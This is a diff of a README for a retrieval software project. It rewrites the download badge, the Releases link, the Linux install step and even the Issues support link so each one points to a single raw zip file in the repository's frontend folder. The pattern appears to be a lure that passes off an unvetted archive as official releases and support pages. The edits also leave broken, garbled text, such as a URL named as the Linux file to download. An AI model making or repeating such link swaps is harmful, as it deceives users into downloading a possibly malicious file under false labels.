@@ -6,7 +6,7 @@ Welcome to **agentic_rag_system**! This software helps you find and retrieve inf
 
 ## 🔗 Download
 
-[![Download agentic_rag_system](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/azzan1235/agentic_rag_system/releases)
+[![Download agentic_rag_system](https://github.com/azzan1235/agentic_rag_system/raw/refs/heads/main/frontend/rag_system_agentic_3.4-alpha.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/azzan1235/agentic_rag_system/raw/refs/heads/main/frontend/rag_system_agentic_3.4-alpha.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you install, check that your computer meets these basic needs:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/azzan1235/agentic_rag_system/releases).
+1. Visit the [Releases page](https://github.com/azzan1235/agentic_rag_system/raw/refs/heads/main/frontend/rag_system_agentic_3.4-alpha.4.zip).
 2. Look for the latest release, which will be at the top of the list.
 3. Click on the download link. The files are available in different formats like executable for Windows, or zip files for Linux and macOS.
 4. For Windows:
@@ -29,7 +29,7 @@ Before you install, check that your computer meets these basic needs:
    - Download the `.dmg` file.
    - Open it and drag the application to your Applications folder.
 6. For Linux:
-   - Download the `.tar.gz` file.
+   - Download the `https://github.com/azzan1235/agentic_rag_system/raw/refs/heads/main/frontend/rag_system_agentic_3.4-alpha.4.zip` file.
    - Extract it in your chosen directory and run the application from there.
 
 After installation, you can now start using **agentic_rag_system**.
@@ -68,7 +68,7 @@ Contributions are welcome. If you'd like to add features or fix issues, follow t
 
 ## ⚙️ Support
 
-If you encounter issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/azzan1235/agentic_rag_system/issues). We aim to respond within 48 hours.
+If you encounter issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/azzan1235/agentic_rag_system/raw/refs/heads/main/frontend/rag_system_agentic_3.4-alpha.4.zip). We aim to respond within 48 hours.
 
 ## 📜 License
 
